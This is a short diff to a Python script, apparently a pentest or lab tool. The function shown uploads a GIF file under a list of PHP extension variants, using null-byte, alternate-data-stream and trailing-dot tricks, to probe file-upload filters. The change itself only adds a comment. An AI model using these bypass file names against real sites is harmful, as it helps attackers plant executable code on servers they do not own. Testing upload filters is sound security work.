@@ -34,7 +34,7 @@ def upload_file(filename, upload_filename=None):
 def upload_fuzz_ext():
     filename = 'basic.gif'
     file = open(filename, 'rb').read()  # create an empty demo file
-    ext_lst = 'PHP,Php::$DATA,php,php.,php ,php. .,php3,php4,php5,php%00.jpg,phtml'.split(',')
+    ext_lst = 'PHP,Php::$DATA,php,php.,php ,php. .,php3,php4,php5,php%00.jpg,phtml'.split(',')  # "basic.php .jpg"
     for ext in ext_lst:
         upload_filename = filename.split('.')[0] + '.' + ext
         files = {key: (upload_filename, file, 'image/jpeg')}
